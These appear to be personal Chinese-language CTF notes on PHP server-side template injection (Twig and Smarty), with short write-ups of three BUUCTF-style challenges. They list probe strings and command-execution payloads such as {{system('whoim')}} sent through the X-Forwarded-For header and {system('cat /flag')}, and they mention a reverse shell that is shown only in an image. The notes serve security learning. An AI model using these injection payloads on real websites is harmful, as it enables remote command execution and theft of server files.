
[1. SSTI（模板注入）漏洞（入门篇）](https://www.cnblogs.com/bmjoker/p/13508538.html)

- PHP
    - Twig
    - Smarty
    - Blade

### [BJDCTF2020]Cookie is so stable

确定模板为php twig模板注入

{{2*10}} 返回结果为20

反弹shell

![Untitled](../../CTF赛题/BUU月赛/attachment/SSTI%20d00cc56a878646898348d1287f999e2c/Untitled.png)

### [BJDCTF2020]The mystery of ip

flag.php会显示ip，可以通过X-Forwarded-For来控制显示内容，应该存在渲染

{{system(”whoim”)}}直接命令执行

![Untitled](../../CTF赛题/BUU月赛/attachment/SSTI%20d00cc56a878646898348d1287f999e2c/Untitled%201.png)

### [CISCN2019 华东南赛区]Web11

![Untitled](../../CTF赛题/BUU月赛/attachment/SSTI%20d00cc56a878646898348d1287f999e2c/Untitled%202.png)

右上角有XFF的意思改一下看看

![Untitled](../../CTF赛题/BUU月赛/attachment/SSTI%20d00cc56a878646898348d1287f999e2c/Untitled%203.png)

`{{7*7}}`确定是SSTI

![Untitled](../../CTF赛题/BUU月赛/attachment/SSTI%20d00cc56a878646898348d1287f999e2c/Untitled%204.png)

但是用pythonSSTI试了一下发现是php而且是smarty

![Untitled](../../CTF赛题/BUU月赛/attachment/SSTI%20d00cc56a878646898348d1287f999e2c/Untitled%205.png)

直接构造{system('cat /flag')}

![Untitled](../../CTF赛题/BUU月赛/attachment/SSTI%20d00cc56a878646898348d1287f999e2c/Untitled%206.png)